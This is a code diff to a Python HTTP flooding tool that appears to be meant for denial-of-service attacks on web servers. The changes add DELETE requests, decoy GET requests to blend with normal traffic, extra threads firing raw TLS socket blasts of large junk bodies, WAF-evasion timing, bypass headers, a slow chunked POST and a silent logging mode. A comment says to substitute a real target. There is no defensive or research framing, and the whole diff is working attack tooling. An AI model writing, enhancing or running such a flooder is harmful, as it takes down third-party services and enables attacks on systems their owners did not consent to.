@@ -13,6 +13,7 @@ import base64
 import argparse
 import shutil
 from datetime import datetime
+import string
 
 # ANSI color codes for output
 ANSI_RED = "\033[91m"
@@ -65,6 +66,7 @@ def load_list(file):
 def load_user_agents(file):
     global user_agents
     if not os.path.exists(file):
+        os.makedirs(os.path.dirname(file), exist_ok=True)
         with open(file, 'w') as f:
             f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n")
     user_agents = load_list(file)
@@ -128,13 +130,9 @@ def recon_target(url):
 def mutate_payload(payload_type):
     if payload_type == "ghost-mutation":
         return json.dumps({
-            "enc": base64.b64encode(json.dumps({
-                "overflow": "A" * random.randint(10000, 20000),
-                "multi": [
-                    {"depth": i, "blob": "X" * random.randint(1000, 3000)}
-                    for i in range(random.randint(10, 30))
-                ]
-            }).encode()).decode()
+            "cmd": f"A{random.randint(1000,9999)}\x00B\x1f",
+            "noise": ''.join(random.choices(string.ascii_letters, k=random.randint(500, 1500))),
+            "forward": "/admin" + "?debug=true" * random.randint(1,3)
         })
     elif payload_type == "mixed":
         return f"data={base64.b64encode(os.urandom(50)).decode()}&chain=A{random.randint(1000,5000)}"
@@ -240,6 +238,8 @@ def rotate_tls_context():
                 return thread_local.tls_ctx
             except ssl.SSLError as e:
                 print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
+    if thread_local.tls_ctx is None:
+        thread_local.tls_ctx = ssl.create_default_context()
     return thread_local.tls_ctx
 
 def analyze_bypass(status_code, response_text):
@@ -297,8 +297,9 @@ def raw_socket_blast(ip, port=443):
     context = rotate_tls_context()
     with socket.create_connection((ip, port)) as sock:
         with context.wrap_socket(sock, server_hostname=ip) as ssock:
+            junk = ''.join(random.choices("ABCDEF1234567890", k=50000))
             for _ in range(10):
-                payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 50000\r\n\r\n{'X'*50000}"
+                payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 50000\r\n\r\n{junk}"
                 ssock.send(payload.encode())
                 time.sleep(0.3)
 
@@ -348,23 +349,18 @@ def launch_ghost_sequence():
 
     def worker():
         local_retry = 0
-        local_headers = get_thread_headers()
-
-        # 🔧 Inisialisasi TLS context kalau belum ada
-        if not hasattr(thread_local, "tls_ctx"):
-            thread_local.tls_ctx = rotate_tls_context()
-
         while not stop_event.is_set():
             try:
                 semaphore.acquire()
-                conn = http.client.HTTPSConnection(parsed_url.hostname, context=thread_local.tls_ctx)
+                conn = http.client.HTTPSConnection(parsed_url.hostname, context=rotate_tls_context())
                 paths = ["/", "/ping", "/admin", "/admin/login", "/?debug", "/v1/chain"]
                 chain_path = random.choice(paths)
                 payload_data = smart_mutate(mutate_payload(payload_type))
-                method = random.choice(["POST", "PUT", "PATCH", "OPTIONS"])
-                if random.random() < 0.3:
-                    local_headers = get_thread_headers()
-                conn.request(method, chain_path, payload_data, local_headers)
+                method = random.choice(["POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
+                if random.random() > 0.7:
+                    conn.request("GET", random.choice(["/", "/home", "/product?id=1", "/help"]))
+                    conn.getresponse()
+                conn.request(method, chain_path, payload_data, inject_headers())
                 start_time = time.time()
                 response = conn.getresponse()
                 rtt = time.time() - start_time
@@ -377,6 +373,8 @@ def launch_ghost_sequence():
                         stop_event.set()
                         break
                     time.sleep(delay + random.uniform(0.2, 1.0))
+                if time.time() % 7 < 2:
+                    threading.Thread(target=raw_socket_blast, args=(parsed_url.hostname,)).start()
                 if time.time() % 8 > 5:
                     time.sleep(2.5)  # Delay burst cooldown
             except Exception as e:
@@ -389,11 +387,6 @@ def launch_ghost_sequence():
                 semaphore.release()
                 time.sleep(delay + random.uniform(0.1, 0.5))
 
-    def get_thread_headers():
-        if not hasattr(thread_local, "headers"):
-            thread_local.headers = inject_headers()
-        return thread_local.headers
-
     thread_pool = []
     for i in range(threads):
         thread = threading.Thread(target=worker)
@@ -401,9 +394,9 @@ def launch_ghost_sequence():
         thread_pool.append(thread)
         time.sleep(random.uniform(0.01, 0.03))  # WAF evasive ramp-up
 
-    if args.dashboard:
+    if args.dashboard and not args.silent:
         threading.Thread(target=render_dashboard).start()
-    else:
+    elif args.silent:
         threading.Thread(target=print_status).start()
 
     if failover_monitoring:
@@ -460,21 +453,25 @@ def print_banner_brutal():
     """)
 
 if __name__ == "__main__":
-    args = argparse.Namespace(
-        target="https://realtarget.com",
-        fire=True,
-        threads=200,
-        silent=False,
-        dashboard=True,
-        stealth_force=False
-    )
+    args = parse_args()
 
     if args.target:
-        target = args.target
-        parsed_url = urlparse(target)
+        try:
+            parsed_url = urlparse(args.target)
+            if not parsed_url.scheme or not parsed_url.hostname:
+                raise ValueError("Invalid URL")
+        except Exception:
+            print(f"{ANSI_RED}[ERROR] Invalid target URL: {args.target}{ANSI_RESET}")
+            sys.exit(1)
     elif args.fire or args.stealth_force:
         target = "https://targetlo.com"  # Ganti dengan target real
-        parsed_url = urlparse(target)
+        try:
+            parsed_url = urlparse(target)
+            if not parsed_url.scheme or not parsed_url.hostname:
+                raise ValueError("Invalid URL")
+        except Exception:
+            print(f"{ANSI_RED}[ERROR] Invalid target URL: {target}{ANSI_RESET}")
+            sys.exit(1)
     else:
         print(f"{ANSI_RED}[ERROR] --target required unless --fire or --stealth-force with fallback{ANSI_RESET}")
         print("Example usage: python script.py --target https://example.com --threads 200 --fire")
@@ -487,6 +484,9 @@ if __name__ == "__main__":
 
     if args.silent:
         silent_mode = True
+        if not log_file_path:
+            log_file_path = f"/sdcard/cyberthread_silentlog_{int(time.time())}.txt"
+        log_file = open(log_file_path, 'a')
 
     if args.fire:
         bypass_header = True
@@ -497,7 +497,7 @@ if __name__ == "__main__":
         payload_type = "ghost-mutation"
         threads = args.threads
         flood_method = "POST"
-        ua_file = "/tmp/ua_fallback.txt"
+        ua_file = os.path.expanduser("~/ua_fallback.txt")
 
     if args.stealth_force:
         bypass_header = True
@@ -508,7 +508,13 @@ if __name__ == "__main__":
         threads = args.threads if args.threads else 300
         delay = 0.05
         flood_method = "PATCH"
-        ua_file = "/tmp/ua_fallback.txt"
+        ua_file = os.path.expanduser("~/ua_fallback.txt")
         threading.Thread(target=slow_chunked_post, args=(parsed_url.hostname,)).start()
+
+    try:
+        socket.gethostbyname(parsed_url.hostname)
+    except socket.gaierror:
+        print(f"{ANSI_RED}[ERROR] Cannot resolve target host: {parsed_url.hostname}{ANSI_RESET}")
+        sys.exit(1)
 
     launch_ghost_sequence()
